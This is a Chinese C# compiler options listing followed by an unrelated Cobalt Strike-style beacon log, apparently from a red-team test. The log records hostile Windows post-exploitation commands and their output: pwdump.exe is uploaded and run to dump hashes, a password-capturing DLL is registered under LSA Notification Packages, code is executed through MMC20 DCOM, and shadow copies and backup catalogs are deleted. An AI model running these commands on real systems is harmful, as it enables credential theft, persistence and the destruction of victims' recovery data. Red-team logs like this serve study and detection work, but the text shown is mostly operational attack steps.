/warnaserror[+|-]:<警告列表>   将特定警告报告为错误
/warn:<n>                      设置警告等级(0-4) (缩写: /w)
/nowarn:<警告列表>             禁用特定的警告消息

                        - 语言 -
/checked[+|-]                  生成溢出检查
/unsafe[+|-]                   允许“不安全”代码
/define:<符号列表>             定义条件编译符号 (缩写: /d)
/langversion:<字符串>          指定语言版本模式: ISO-1、ISO-2、3、4、5 或 Default

                        - 安全性 -
/delaysign[+|-]                仅使用强名称密钥的公共部分对程序集进行延迟签名
/keyfile:<文件>                指定强名称密钥文件
/keycontainer:<字符串>         指定强名称密钥容器
/highentropyva[+|-]            启用高平均信息量的 ASLR

                        - 杂项 -
@<文件>                        有关更多选项，请阅读响应文件
/help                          显示此用法信息 (缩写: /?)
/nologo                        取消编译器版权信息
/noconfig                      不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<地址>            要生成的库的基址
/bugreport:<文件>              创建“Bug 报告”文件
/codepage:<n>                  指定打开源文件时要使用的代码页
/utf8output                    以 UTF-8 编码格式输出编译器消息
/main:<类型>                   指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                     编译器生成完全限定路径
/filealign:<n>                 指定用于输出文件节的对齐方式
/pdb:<文件>                    指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/errorendlocation              输出每个错误的结束位置的行和列
/preferreduilang               指定首选输出语言名称。
/nostdlib[+|-]                 不引用标准库(mscorlib.dll)
/subsystemversion:<字符串>     指定此程序集的子系统版本
/lib:<文件列表>                指定要在其中搜索引用的附加目录
/errorreport:<字符串>          指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/appconfig:<文件>              指定一个包含程序集绑定设置的应用程序配置文件
/moduleassemblyname:<字符串>   此模块所属程序集的名称



03/02 13:52:37 [task] 测试 IOAT1098_001 
03/02 13:52:55 [checkin] host called home, sent: 55 bytes
03/02 13:52:57 [output]
received output:
帐户已经存在。

请键入 NET HELPMSG 2224 以获得更多的帮助。



03/02 14:01:09 [task] 传输dump工具到服务端并执行
03/02 14:01:09 [task] Tasked beacon to make directory c:\RedTeam\
03/02 14:01:09 [task] cd c:\RedTeam\
03/02 14:01:09 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\pwdump.exe as pwdump.exe
03/02 14:01:09 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes pwdump.exe
03/02 14:01:09 [task] Tasked beacon to execute: c:\redteam\pwdump.exe
03/02 14:01:57 [checkin] host called home, sent: 169561 bytes
03/02 14:34:17 [task] cd c:\Windows\System32
03/02 14:34:17 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe QUERY HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages"
03/02 14:34:17 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0aisakeng" /f
03/02 14:34:57 [checkin] host called home, sent: 390 bytes
03/02 14:34:58 [output]
received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli\0aisakeng


c:\Windows\System32>

03/02 14:34:58 [output]
received output:
操作成功完成。

c:\Windows\System32>

03/02 14:56:03 [task] Tasked beacon to run: sc start DcomLaunch
03/02 14:56:03 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
03/02 14:56:58 [checkin] host called home, sent: 617 bytes
03/02 14:57:06 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



03/02 15:26:48 [task] 
03/02 15:26:49 [task] Tasked Beacon to execute: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all in a high integrity context
03/02 15:27:06 [checkin] host called home, sent: 75478 bytes
03/02 15:27:07 [output]
received output:
[-] You're already in a high integrity context.

03/02 15:33:35 [task] 
03/02 15:33:35 [task] Tasked beacon to run: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all
03/02 15:34:07 [checkin] host called home, sent: 110 bytes
03/02 15:34:10 [output]
received output:
ERROR:
Description = Initialization failure


